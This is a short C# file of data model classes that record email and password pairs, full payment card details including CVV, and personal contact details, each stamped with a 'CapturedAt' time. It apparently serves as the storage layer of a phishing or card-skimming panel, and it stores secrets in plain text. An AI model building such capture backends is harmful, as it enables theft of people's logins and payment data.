using System;

namespace Data
{
    public class LogEntry
    {
        public int Id { get; set; }
        public string Type { get; set; } = string.Empty;
        public string? Email { get; set; }
        public string? Password { get; set; }
        public DateTime CapturedAt { get; set; } = DateTime.UtcNow;
    }

    public class CardEntry
    {
        public int Id { get; set; }
        public string? Num { get; set; }
        public string? Name { get; set; }
        public string? Expiry { get; set; }
        public string? Cvv { get; set; }
        public DateTime CapturedAt { get; set; } = DateTime.UtcNow;
    }

    public class PersonalInfoEntry
    {
        public int Id { get; set; }
        public string? FirstName { get; set; }
        public string? LastName { get; set; }
        public string? Email { get; set; }
        public string? Phone { get; set; }
        public string? Address { get; set; }
        public string? City { get; set; }
        public string? RawJson { get; set; }
        public DateTime CapturedAt { get; set; } = DateTime.UtcNow;
    }
}
